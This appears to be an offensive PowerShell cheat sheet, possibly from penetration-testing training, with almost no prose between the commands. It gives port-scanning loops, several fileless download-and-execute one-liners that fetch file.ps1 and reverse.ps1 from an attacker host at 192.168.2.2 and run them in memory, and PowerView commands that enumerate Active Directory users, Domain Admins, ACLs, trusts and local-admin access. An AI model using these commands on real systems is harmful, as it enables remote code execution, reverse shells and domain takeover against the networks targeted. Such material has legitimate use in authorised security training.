''' Ping with IP Powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
'''

'''
1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}
'''

'''PowerShell in-memory Download and Execute

iex (iwr 'http://192.168.2.2/file.ps1')

--------------------------

$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
$read = $down.GetResponse()
IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()

--------------------------

$file=New-Object -ComObject
Msxml2.XMLHTTP;$file.open('GET','http://192.168.2.2/file.ps1',$false);$file.sen
d();iex $file.responseText

--------------------------

iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')

--------------------------

$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.2.2/reverse.ps1 ‘);
sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

--------------------------

'''


# Domain Enumerate
''' Get current domain

Get-NetDomain
Get-NetDomain –Domain cyberwarfare.corp

'''

''' Retrieve Current SID and Domain Controller 

Get-NetDomainController –Domain cyberwarfare.corp
Get-DomainSID

'''

'''Retrieve a list of users in the current domain

Get-NetUser
Get-NetUser –UserName emp1

'''

''' Retrieve a list of computers in the current domain

Get-NetComputer
Get-NetComputer – FullData
Get-NetComputer –OperatingSystem “Windows Server 2016 Standard”

'''

''' List all domain groups in the current domain

Get-NetGroup
Get-NetGroup –FullData
Get-NetGroup –Domain cyberwarfare.corp

'''

''' Enumerate privilege domain group members and local administrators
group members 

Get-NetGroupMember –GroupName “Domain Admins” -verbose
Get-NetLocalGroup –ComputerName DC-01 -ListGroups

'''

'''ACL Enumeration, get the ACLs associated with an entity
 
Get-ObjectAcl -SamAccountName <Domain_User> –ResolveGUIDs

'''
''' Unique and interesting ACL Scanning

Invoke-ACLScanner –ResolveGUIDs

'''

''' Enumerate Domain Trusts

Get-NetDomainTrust
Get-NetDomainTrust –Domain cyberwarfare.corp

'''

'''Enumerate all domain in a Forest

Get-NetForestDomain –Verbose
Get-NetForest -Verbose

'''
''' Find computer sessions where current user has local admin access

Find-LocalAdminAccess -Verbose

'''

